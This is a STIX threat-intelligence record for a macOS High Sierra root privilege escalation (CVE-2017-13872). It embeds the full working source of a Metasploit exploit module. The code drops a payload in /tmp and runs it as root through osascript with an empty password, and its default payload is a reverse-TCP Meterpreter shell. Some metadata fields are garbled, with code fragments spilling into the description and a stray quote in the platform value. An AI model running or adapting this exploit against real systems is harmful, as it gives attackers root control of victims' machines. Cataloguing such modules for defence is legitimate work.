{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--284b95ad-bacb-43fe-949a-024c45c4469b",
    "created": "2024-08-14T16:34:48.044896Z",
    "modified": "2024-08-14T16:34:48.0449Z",
    "name": "Mac OS X Root Privilege Escalation",
    "description": " This module exploits a serious flaw in MacOSX High Sierra. Any user can login with user \"root\", leaving an empty password.  'License'       => MSF_LICENSE 'References'    => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/root_no_password.rb",
            "external_id": "root_no_password.rb"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/lemiorhan/status/935578694541770752"
        },
        {
            "source_name": "reference",
            "url": "https://news.ycombinator.com/item?id=15800676"
        },
        {
            "source_name": "reference",
            "url": "https://forums.developer.apple.com/thread/79235"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X Root Privilege Escalation',\n      'Description'   => %q{\n        This module exploits a serious flaw in MacOSX High Sierra.\n        Any user can login with user \"root\", leaving an empty password.\n      },\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'CVE', '2017-13872' ],\n          [ 'URL', 'https://twitter.com/lemiorhan/status/935578694541770752' ],\n          [ 'URL', 'https://news.ycombinator.com/item?id=15800676' ],\n          [ 'URL', 'https://forums.developer.apple.com/thread/79235' ],\n        ],\n      'Platform'      => 'osx',\n      'Arch'          => ARCH_X64,\n      'Author'         => [\n        'chethan177',  # earliest public discovery\n        'lemiorhan',   # making this well-known via Twitter\n        'timwr',       # Metasploit module\n      ],\n      'DefaultOptions' =>\n      {\n        'PAYLOAD'      => 'osx/x64/meterpreter_reverse_tcp',\n      },\n      'SessionTypes'  => [ 'shell', 'meterpreter' ],\n      'Targets'       => [\n        [ 'Mac OS X 10.13.1 High Sierra x64 (Native Payload)', { } ]\n      ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2017-11-29'\n    ))\n  end\n\n  def exploit_cmd(root_payload)\n    \"osascript -e 'do shell script \\\"#{root_payload}\\\" user name \\\"root\\\" password \\\"\\\" with administrator privileges'\"\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    payload_file = \"/tmp/#{Rex::Text::rand_text_alpha_lower(12)}\"\n    print_status(\"Writing payload file as '#{payload_file}'\")\n    write_file(payload_file, payload.raw)\n    register_file_for_cleanup(payload_file)\n    output = cmd_exec(\"chmod +x #{payload_file}\")\n    print_status(\"Executing payload file as '#{payload_file}'\")\n    cmd_exec(exploit_cmd(payload_file))\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-11-29",
    "x_mitre_platforms": [
        "osx'"
    ]
}